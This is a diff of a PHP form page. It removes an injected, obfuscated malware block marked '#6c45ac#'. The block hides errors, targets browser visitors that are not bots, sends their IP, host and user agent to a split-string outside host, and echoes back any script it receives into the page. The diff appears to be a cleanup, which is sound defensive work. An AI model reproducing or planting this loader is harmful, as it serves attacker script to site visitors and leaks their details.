@@ -87,35 +87,4 @@ echo '<table><tr valign=top><td>
 <br><input type=submit name="Submit">
 </fieldset></form>
 </td></tr></table>';
-
-
-
-?>
-<?php
-#6c45ac#
-error_reporting(0); ini_set('display_errors',0); $wp_e0270 = @$_SERVER['HTTP_USER_AGENT'];
-if (( preg_match ('/Gecko|MSIE/i', $wp_e0270) && !preg_match ('/bot/i', $wp_e0270))){
-$wp_e090270="http://"."template"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_e0270);
-$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_e090270);
-curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_0270e = curl_exec ($ch); curl_close($ch);}
-if ( substr($wp_0270e,1,3) === 'scr' ){ echo $wp_0270e; }
-#/6c45ac#
-?>
-<?php
-
-?>
-<?php
-
-?>
-<?php
-
-?>
-<?php
-
-?>
-<?php
-
-?>
-<?php
-
 ?>
